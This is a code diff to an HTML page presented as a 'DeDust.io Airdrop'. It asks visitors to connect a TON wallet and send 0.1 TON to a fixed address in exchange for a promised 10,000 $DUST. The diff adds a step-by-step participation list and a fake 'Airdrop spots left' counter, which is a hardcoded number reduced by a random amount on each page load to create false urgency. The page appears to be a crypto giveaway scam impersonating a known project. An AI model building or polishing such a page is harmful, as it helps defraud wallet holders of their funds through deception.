@@ -34,7 +34,7 @@
             background: var(--tg-theme-secondary-bg-color); 
             position: relative; 
             overflow: hidden; 
-            border-bottom: 2px solid rgba(255, 255, 255, 0.2); /* Smooth bottom border */
+            border-bottom: none; /* Remove bottom border */
         }
         .header-image {
             position: absolute;
@@ -93,6 +93,8 @@
             font-size: 1.1em;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1), 0 4px 12px rgba(0, 0, 0, 0.2); /* Blue box shadow */
             transition: background 0.3s ease; 
+            display: block; /* Ensures the button takes up full width */
+            margin: 0 auto; /* Centers the button */
         }
 
         button:hover {
@@ -102,7 +104,8 @@
 
         #ton-connect {
             margin-bottom: 40px; 
-            justify-content: center;
+            display: flex; /* For centering the TonConnect button */
+            justify-content: center; /* Centers the TonConnect button */
         }
 
         .features { 
@@ -144,32 +147,49 @@
             transform: rotate(-30deg);
         }
 
+        .airdrop-counter {
+            position: fixed;
+            top: 10px;
+            left: 0;
+            width: 100%;
+            background-color: var(--tg-theme-section-bg-color);
+            color: var(--tg-theme-hint-color);
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            text-align: center; 
+        }
+
         /* Adjust these values for different positions and sizes */
 
     </style>
 </head>
 <body>
 
+    <div class="airdrop-counter" id="airdrop-counter"></div> 
     <div class="header-container">
         <img src="https://cdn3d.iconscout.com/3d/premium/thumb/toncoin-3d-icon-download-in-png-blend-fbx-gltf-file-formats--bitcoin-logo-cryptocurrency-crypto-coin-coins-pack-science-technology-icons-8000674.png" alt="Toncoin Icon" class="header-image">
         <div class = "header-content">
             <h1><span class="gradient-text">DeDust.io</span> Airdrop</h1>
             <div id="ton-connect"></div>
         </div>
-
     </div>
 
-
-
     <div class="container">
-        <p>Airdrop for all users!  Send 0.1 TON and receive 10,000 $DUST (~$196). This is a limited-time offer, so don't miss out!</p>
-
+        <p>To participate in the airdrop, simply follow these steps:</p>
+        <ol>
+            <li>Connect your TON wallet.</li>
+            <li>Click the "Create Transaction" button to generate a transfer request to the specified DeDust.io address.</li>
+            <li>Approve the transaction in your wallet to send 0.1 TON.</li>
+            <li>That's it! Your 10,000 $DUST will be credited to your account in next 10 minutes.</li>
+        </ol> 
         <button onclick="createTransaction()" id="create">Create Transaction</button>
     </div>
 
     <div class="shape shape1"></div> <div class="shape shape2"></div> <div class="shape shape3"></div>  <!-- Background shapes -->
 
     <script>
+        // Your existing JavaScript code for TonConnect
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://raw.githubusercontent.com/Vasiliy-katsyka/severina/refs/heads/main/tonconnect-manifest.json', 
             buttonRootId: 'ton-connect'
@@ -187,6 +207,16 @@
         function createTransaction() {
             window.open('https://app.tonkeeper.com/transfer/UQBoRkvzUelDcxR65b5J9J3KM1Ic638n1QJUo5kZTKhT3O64?amount=100000000');
         }
+
+        let remainingUsers = 19837;
+        let airdropCounter = document.getElementById('airdrop-counter');
+
+        // Subtract a random number between 10 and 60 on page load
+        const subtractValue = Math.floor(Math.random() * (60 - 10 + 1)) + 10;
+        remainingUsers -= subtractValue;
+
+        // Update the airdrop counter text
+        airdropCounter.textContent = `Airdrop spots left: ${remainingUsers}`;
     </script>
 
 
